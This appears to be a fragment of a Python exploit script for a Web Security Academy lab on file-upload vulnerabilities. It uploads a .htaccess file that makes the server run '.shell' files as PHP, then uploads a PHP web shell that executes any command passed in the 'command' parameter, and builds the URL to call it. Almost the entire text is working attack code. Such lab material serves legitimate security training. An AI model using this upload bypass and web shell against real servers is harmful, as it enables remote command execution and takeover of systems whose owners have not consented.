...
URL = "https://0ada00ab04830c6585c1f98300d00039.web-security-academy.net"
login = URL + "/login"
...
htaccess_payload = {
    'avatar': ('.htaccess', "AddType application/x-httpd-php .shell", 'text/plain'),
    'user':(None,'wiener'),
    'csrf':(None, csrf_token)
} 
wshell_payload = {
    'avatar': ('wshell.shell', "<?php system($_GET['command']); ?>", 'application/x-php'),
    'user':(None,'wiener'),
    'csrf':(None, csrf_token)
}
request = requests.Request('POST', avatar, files=htaccess_payload)
prepped = client.prepare_request(request)
response = client.send(prepped, verify=False)

request = requests.Request('POST', avatar, files=wshell_payload)
prepped = client.prepare_request(request)
...
wshell_url = URL + "/files/avatars/wshell.shell"
